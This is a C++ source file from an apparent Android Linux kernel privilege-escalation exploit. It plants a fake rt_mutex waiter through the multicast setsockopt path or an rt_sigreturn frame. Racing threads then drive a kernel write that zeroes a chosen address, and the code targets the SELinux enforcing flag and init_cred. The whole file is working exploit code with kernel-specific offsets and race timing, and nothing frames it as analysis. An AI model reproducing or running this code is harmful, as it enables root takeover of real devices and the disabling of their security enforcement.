#include <netinet/in.h>
#include <ctime>
#include <unistd.h>

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "memory/payload_builder.h"
#include "route/route_status.h"
#include "route/sigreturn_stamp.h"
#include "session/exploit_session.hpp"
#include "kernel/target.h"
#include "kernel/constants.hpp"
#include "kernel/runtime_struct_offsets.h"

using namespace lsprivilege;

namespace lsprivilege::route {
    route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
        (void) request;
        route::RouteStatus status = {.code = ROUTE_RETRYABLE};
        profile::MulticastWaiterLayout layout =
                session::g_exploit_session.profile.multicast_layout();
        /* Absent geometry (e.g. an underivable waiter_off) is a hard refusal:
         * one-shot multicast must never guess a landing. */
        if (!layout.buffer_size || !layout.waiter_offset || !layout.task_offset ||
            !layout.lock_offset) {
            status.step = 58;
            status.error_number = EINVAL;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            status.code = ROUTE_FALLBACK_SAFE;
            pr_warning("multicast geometry incomplete (waiter_off not provided)\n");
            return status;
        }
        const size_t stamp_size = *layout.buffer_size;
        /* VLA size comes from the validated profile geometry; the encode step
     * rejects an undersized buffer before any indexed write. */
    __extension__ unsigned char stamp[stamp_size]; // NOLINT(clang-analyzer-core.VLASize)
        memset(stamp, 0, sizeof(stamp));
        if (!memory::encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(stamp), stamp_size},
            static_cast<size_t>(*layout.waiter_offset), *layout.task_offset,
            *layout.lock_offset,
            (session::g_exploit_session.heap.current.fake_task), (session::g_exploit_session.heap.current.fake_lock))) {
            status.step = 59;
            status.error_number = EOVERFLOW;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            pr_warning("multicast byte injection rejected: waiter=%zu task=%zu "
                       "lock=%zu buffer=%zu\n", static_cast<size_t>(*layout.waiter_offset),
                       static_cast<size_t>(*layout.task_offset),
                       static_cast<size_t>(*layout.lock_offset), stamp_size);
            return status;
        }
        const uint32_t delivery = layout.stamp_delivery.value_or(0);
        alignas(16) uint8_t frame[kSigStampFrameBytes];
        int32_t fd = -1;
        if (delivery == kStampDeliverySigreturn) {
            /* Shallow-frame 5.10: the IPv4 msfilter copy window cannot reach
             * the waiter, so the same encoded stamp is delivered through
             * rt_sigreturn's fpsimd restore instead. The waiter carries flat
             * pi_tree_entry at +0x18 (no wake_state word) and prio at +0x40;
             * planting parent=target-8 with zero children makes the EDEADLK
             * rb_erase write *(target)=0 deterministically. */
            constexpr size_t kPiTreeOffFlat510 = 0x18;
            constexpr size_t kPrioOffFlat510 = 0x40;
            if (!request || !request->target ||
                !memory::encode_multicast_waiter_trees(
                        {reinterpret_cast<std::byte *>(stamp), stamp_size},
                        static_cast<size_t>(*layout.waiter_offset),
                        kPiTreeOffFlat510, request->target)) {
                status.step = 59;
                status.error_number = EOVERFLOW;
                status.userspace_clean = 1;
                status.kernel_disarmed = 1;
                status.code = ROUTE_FALLBACK_SAFE;
                pr_warning("sigreturn stamp: tree field injection failed\n");
                return status;
            }
            const size_t prio_off =
                    static_cast<size_t>(*layout.waiter_offset) + kPrioOffFlat510;
            const uint32_t prio = static_cast<uint32_t>(kernel::FAKE_WAITER_PRIO);
            if (prio_off + sizeof(prio) > stamp_size) {
                status.step = 59;
                status.error_number = EOVERFLOW;
                status.userspace_clean = 1;
                status.kernel_disarmed = 1;
                status.code = ROUTE_FALLBACK_SAFE;
                pr_warning("sigreturn stamp: prio word outside stamp "
                           "(off=0x%zx size=%zu)\n", prio_off, stamp_size);
                return status;
            }
            memcpy(stamp + prio_off, &prio, sizeof(prio));
            build_sigreturn_stamp_frame(
                    frame, stamp, stamp_size, current_blocked_sigmask());
            /* Diagnostic: what the stamp plants and where the walk lands. */
            pr_info("sigreturn stamp: off=%zu w.task=%016zx w.lock=%016zx "
                    "w.pc=%016llx w.prio=%u page=%016zx target=%016zx\n",
                    static_cast<size_t>(*layout.waiter_offset),
                    static_cast<size_t>(session::g_exploit_session.heap.current.fake_task),
                    static_cast<size_t>(session::g_exploit_session.heap.current.fake_lock),
                    (unsigned long long) memory::load_stamp_u64(
                            stamp, stamp_size,
                            static_cast<size_t>(*layout.waiter_offset)),
                    static_cast<unsigned>(memory::load_stamp_u64(
                            stamp, stamp_size,
                            static_cast<size_t>(*layout.waiter_offset) + kPrioOffFlat510) &
                            0xffffffffu),
                    static_cast<size_t>(session::g_exploit_session.heap.current.base),
                    static_cast<size_t>(request->target));
        } else {
            uint16_t family = AF_UNSPEC;
            memcpy(stamp + 8, &family, sizeof(family));

            fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
            if (fd < 0) {
                status.step = 60;
                status.error_number = errno;
                status.userspace_clean = 1;
                status.kernel_disarmed = 1;
                status.code = ROUTE_FALLBACK_SAFE;
                return status;
            }
        }
        session::g_exploit_session.race.consumer_calls.store(0);
        session::g_exploit_session.race.consumer_success.store(0);
        session::g_exploit_session.race.consumer_stop.store(0);
        session::g_exploit_session.race.route_delay_usec.store(0);
        errno = 0;
        int32_t stamp_result;
        if (delivery == kStampDeliverySigreturn) {
            /* Surviving the restore means the copy landed; a frame fault
             * kills this thread with SIGSEGV instead of returning. */
            lsprivilege_fire_sigreturn_stamp(frame);
            stamp_result = 0;
        } else {
            stamp_result =
                    setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
        }
        status.step = 61;
        status.error_number = errno;
        session::g_exploit_session.race.consumer_go.store(1);
        const bool selinux_write =
                delivery == kStampDeliverySigreturn && request &&
                request->target ==
                        session::g_exploit_session.addresses.data_alias(
                                lsprivilege::profile::selinux_enforcing());
        if (selinux_write) {
            /* Keep the window armed until the consumer has spent its full
             * call budget. The erase lands asynchronously inside a PI walk,
             * so the consumer itself closes the window the moment it observes
             * the enforce flip; tearing down on the first call would race the
             * in-flight reposition. Only the selinux write can self-close —
             * extending other windows would re-erase the dequeued node. */
            const uint32_t budget =
                    session::g_exploit_session.profile.select_consumer_max_calls();
            for (int32_t spin = 0; spin < 100000000 &&
                               (session::g_exploit_session.race.consumer_go.load() != 0 &&
                                session::g_exploit_session.race.consumer_calls.load() <
                                        static_cast<int32_t>(budget)); spin++)
                __asm__ volatile (


        "yield"
        ::: "memory");
        } else {
            for (int32_t spin = 0; spin < 100000000 &&
                               session::g_exploit_session.race.consumer_calls.load() == 0; spin++)
                __asm__ volatile (


        "yield"
        ::: "memory");
        }
        session::g_exploit_session.race.consumer_go.store(0);
        while (session::g_exploit_session.race.consumer_inflight.load())
            __asm__ volatile (


        "yield"
        ::: "memory");
        if (fd >= 0) close(fd);
        status.userspace_clean = 1;
        status.kernel_disarmed = 1;
        if (stamp_result == 0 ||
            session::g_exploit_session.race.consumer_success.load() > 0) {
            status.step = 0;
            status.error_number = 0;
            status.code = ROUTE_OK;
        } else {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
                status.code, status.userspace_clean, status.kernel_disarmed,
                status.step, status.error_number);
        return status;
    }

    /* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */
} // namespace lsprivilege::route

#if defined(__ANDROID__)
#include "race/threads.hpp"
#include "route/route_policy.hpp"

namespace lsprivilege::route {
    /* MulticastPolicy route hooks (Batch 4). Declared in route_policy.hpp,
     * defined here because the implementations are Android-only. The one-shot
     * route keeps its own small stack frame in
     * do_kernel5_fake_lock_route() and shares only the pure payload encoding. */
    bool MulticastPolicy::w2_fast_repair_prebuild(
        session::ExploitSession &exploit_session) noexcept {
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        (exploit_session.heap.current.base) =
                support::prepare_good_kernel_page(repair_request);
        if (!(exploit_session.heap.current.base) || !support::stash_prebuilt_page()) {
            pr_warning("W2 fast repair prebuild failed\n");
            support::discard_prebuilt_page();
            return false;
        }
        pr_info("W2 fast repair payload prebuilt\n");
        return true;
    }

    bool MulticastPolicy::w2_fast_repair_activate(
        session::ExploitSession &exploit_session) noexcept {
        if (!support::activate_prebuilt_page()) {
            pr_warning("W2 fast repair activation failed\n");
            return false;
        }
        const memory::WriteRequest repair_request = memory::WriteRequest::make(
            exploit_session.addresses.data_alias(
                exploit_session.addresses.init_cred_image_addr()) + 8,
            memory::WriteMode::Zero, 1);
        pr_info("W2b: firing prebuilt init_cred+8 repair\n");
        exploit_session.race.fast_repair.store(1);
        const Status repaired = race::run_main_route_threads(repair_request);
        exploit_session.race.fast_repair.store(0);
        if (!repaired) {
            pr_warning("W2 fast repair route failed\n");
            return false;
        }
        return true;
    }
} // namespace lsprivilege::route
#endif
